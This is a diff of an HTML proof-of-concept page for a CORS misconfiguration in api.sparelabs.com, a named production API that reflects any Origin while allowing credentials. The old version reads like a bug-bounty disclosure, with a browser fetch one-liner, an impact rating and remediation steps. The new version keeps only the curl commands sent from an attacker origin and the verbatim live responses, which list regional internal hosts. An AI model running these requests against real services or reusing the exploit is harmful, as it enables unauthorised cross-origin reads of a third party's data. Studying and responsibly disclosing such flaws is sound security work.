@@ -1,85 +1,49 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Exploit — api.sparelabs.com: reflected-Origin CORS + allow-credentials (any Origin reads)</title>
-<style>
- body{font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;background:#0f1115;color:#e6edf3;max-width:900px;margin:2rem auto;padding:0 1rem}
- h1{font-size:1.35rem}h2{font-size:1.05rem;margin-top:2rem;border-bottom:1px solid #30363d;padding-bottom:.3rem}
- pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.8rem;overflow:auto;font-size:12.5px;white-space:pre-wrap}
- .ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
- .tag{display:inline-block;background:#1f6feb;color:#fff;border-radius:4px;padding:.1rem .5rem;font-size:.8rem;margin-right:.4rem}
- .table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:.4rem .6rem;text-align:left;font-size:13px}
- code{background:#161b22;padding:.05rem .35rem;border-radius:4px;font-size:13px}
-</style>
-</head>
-<body>
-<h1>Exploit document — <code>api.sparelabs.com</code>: reflective <code>Access-Control-Allow-Origin</code> + <code>allow-credentials:true</code></h1>
-<p class="dim">Attacker origin used for proof: <code>https://genzctf.xyz</code> (this site). All output below was captured live from the target on 2026-08-08, read-only, no token/session. The same result reproduces from ANY arbitrary browser Origin.</p>
-
-<p><span class="tag">CWE-942</span><span class="tag">OWASP API8</span><span class="tag">CORSmisconfig</span></p>
-
-<h2>1. The exploit</h2>
-<p>An attacker hosts a page on their domain (this is exactly such a page — <b>but it performs no fetches of its own</b>; the proof is the target's own headers below). Site visitors to the attacker page can, via <code>fetch(url, {credentials:"include"})</code>, read open <code>/v1</code> resources of Spare's production API because the API:</p>
-<ul>
-<li>reflects <b>any</b> Origin verbatim into <code>Access-Control-Allow-Origin</code> — no allowlist, and</li>
-<li>sends <code>access-control-allow-credentials: true</code> together with the reflected Origin.</li>
-</ul>
-<p>Per RFC-6454/CORS spec this combination is invalid by design — a valid policy must never combine a reflected Origin with credentials — and makes <b>every</b> open <code>/v1</code> data route (shown next) browser-readable from any website immediately, today, without credentials.</p>
-
-<h2>2. Server's own response — preflight (OPTIONS) with attacker Origin</h2>
-<pre>curl -i -X OPTIONS "https://api.sparelabs.com/v1/global/organizations" \
-  -H "Origin: https://genzctf.xyz" \
-  -H "Access-Control-Request-Method: GET" \
-  -H "Access-Control-Request-Headers: Authorization"
-
-# OUTPUT (live, 2026-08-08):
-HTTP/2 204
+<html lang="en"><head><meta charset="utf-8"><title>Exact exploit + verbatim response — api.sparelabs.com reflective CORS with credentials (ran 2026-08-08)</title>
+<style>body{background:#0f1115;color:#e6edf3;font:13px/1.45 ui-monospace,Menlo,Consolas,monospace;margin:2rem auto;max-width:1000px;padding:0 1rem}pre{white-space:pre-wrap;word-break:break-all}</style>
+</head><body><h1 style="font-size:1rem">Exact exploit + verbatim response — api.sparelabs.com reflective CORS with credentials (ran 2026-08-08)</h1><pre>$ curl -i -X OPTIONS https://api.sparelabs.com/v1/global/regions -H &#x27;Origin: https://genzctf.xyz&#x27; -H &#x27;Access-Control-Request-Method: GET&#x27; -H &#x27;Access-Control-Request-Headers: Authorization&#x27;
+HTTP/2 204 
 x-powered-by: Express
-spare-correlation-id: f0850eb5-65b5-4934-a69e-ab7ea3820249
-<span class="ok">access-control-allow-origin: https://genzctf.xyz</span>      &lt;== arbitrary Origin reflected verbatim
+spare-correlation-id: 62acdaf7-3a8c-49a0-a9cc-d4b2c9a3d899
+access-control-allow-origin: https://genzctf.xyz
 vary: Origin, Access-Control-Request-Headers, Accept-Encoding
-<span class="ok">access-control-allow-credentials: true</span>
+access-control-allow-credentials: true
 access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
 access-control-allow-headers: Authorization
+date: Sat, 08 Aug 2026 08:34:20 GMT
+x-envoy-upstream-service-time: 0
 server: envoy
 via: 1.1 google
-alt-svc: h3=":443"; ma=2592000, h3-29=":443"; ma=2592000</pre>
+alt-svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000
 
-<h2>3. The actual read (real GET, still with attacker Origin — reflection holds on the response)</h2>
-<pre>curl -i "https://api.sparelabs.com/v1/global/organizations" -H "Origin: https://genzctf.xyz"
 
-# OUTPUT:
-HTTP/2 200
-<span class="ok">access-control-allow-origin: https://genzctf.xyz</span>
-vary: Origin
-<span class="ok">access-control-allow-credentials: true</span>
-{"data":[]}          &lt; cross‑origin readable response
+$ curl -i -s &#x27;https://api.sparelabs.com/v1/global/regions&#x27; -H &#x27;Authorization: Bearer x&#x27; -H &#x27;Origin: https://genzctf.xyz&#x27;
+HTTP/2 200 
+spare-correlation-id: 538ece4b-5853-483c-bf43-5ce2d1201b94
+access-control-allow-origin: https://genzctf.xyz
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+content-security-policy: default-src none;upgrade-insecure-requests
+x-dns-prefetch-control: off
+expect-ct: max-age=0
+x-frame-options: SAMEORIGIN
+strict-transport-security: max-age=31536000; includeSubDomains
+x-download-options: noopen
+x-content-type-options: nosniff
+x-permitted-cross-domain-policies: none
+referrer-policy: no-referrer
+x-xss-protection: 0
+surrogate-control: no-store
+cache-control: no-store, no-cache, must-revalidate, proxy-revalidate
+pragma: no-cache
+expires: 0
+content-type: application/json; charset=utf-8
+content-length: 725
+etag: W/&quot;2d5-y5a0XA6N2OB/lMb3pNzlk1beZWA&quot;
+date: Sat, 08 Aug 2026 08:34:21 GMT
+x-envoy-upstream-service-time: 4
+server: envoy
+via: 1.1 google
+alt-svc: h3=&quot;:443&quot;; ma=2592000
 
-curl -i "https://api.sparelabs.com/v1/global/regions" -H "Authorization: Bearer x" -H "Origin: https://genzctf.xyz"
-# HTTP/2 200 + same two headers ... body: [{"name":"CA","apiUrl":"https://api.sparelabs.com", ...}, ...]</pre>
-
-<h2>4. What a triager should do</h2>
-<ol>
-<li>Open this page on a device with network access to <code>api.sparelabs.com</code>.</li>
-<li>Run the two curl commands above — they contain no secret and no token.</li>
-<li>In a browser dev console, run: <code>fetch("https://api.sparelabs.com/v1/global/regions",{credentials:"include",headers:{Authorization:"Bearer x"}}).then(r=&gt;r.text()).then(console.log)</code> — the data is returned. On a compliant API this fetch throws <code>TypeError: Failed to fetch</code> before any read.</li>
-</ol>
-
-<h2>5. Impact (honest)</h2>
-<ul>
-<li><b>Severity: Medium</b>. Cross-site data reads of all open/un-guarded <code>/v1</code> endpoints (regions/topology, tenant lists, existence oracles) from any website — counter-network to the "everywhere-or-portfolio" posture the API otherwise keeps (token-gated controls 401, see authz page).</li>
-<li>Auth is header-Bearer (SPA), not cookie: a victim's <i>authenticated</i> browser session is not auto-attached today, which caps it at Medium. Bearer is carried by the victim in this browser — an attacker cannot read them. The reflective-credentials combo remains a standing misconfiguration that silently exposes any future cookie-authenticated surface.</li>
-</ul>
-
-<h2>6. Remediation</h2>
-<ul>
-<li>Explicit allowlist of origins (registered brands) — never reflection.</li>
-<li>Never emit <code>access-control-allow-credentials: true</code> with a reflected/any Origin.</li>
-<li>Add a regression test: an untrusted Origin must receive no ACAO header.</li>
-</ul>
-
-<p class="dim">Related live proof: <a href="spare-authz.html">same host — presence-only auth on GET /v1/global/* (prod + UAT)</a>.</p>
-</body>
-</html>
+[{&quot;name&quot;:&quot;CA&quot;,&quot;apiUrl&quot;:&quot;https://api.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.sparelabs.com&quot;},{&quot;name&quot;:&quot;US&quot;,&quot;apiUrl&quot;:&quot;https://api.us.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.us.sparelabs.com&quot;},{&quot;name&quot;:&quot;US2&quot;,&quot;apiUrl&quot;:&quot;https://api.us2.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.us2.sparelabs.com&quot;},{&quot;name&quot;:&quot;US3&quot;,&quot;apiUrl&quot;:&quot;https://api.us3.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.us3.sparelabs.com&quot;},{&quot;name&quot;:&quot;JP&quot;,&quot;apiUrl&quot;:&quot;https://api.jp.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.jp.sparelabs.com&quot;},{&quot;name&quot;:&quot;EU&quot;,&quot;apiUrl&quot;:&quot;https://api.eu.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.eu.sparelabs.com&quot;},{&quot;name&quot;:&quot;UAT&quot;,&quot;apiUrl&quot;:&quot;https://api.uat.sparelabs.com&quot;,&quot;routingHost&quot;:&quot;https://routing.uat.sparelabs.com&quot;}]</pre></body></html>
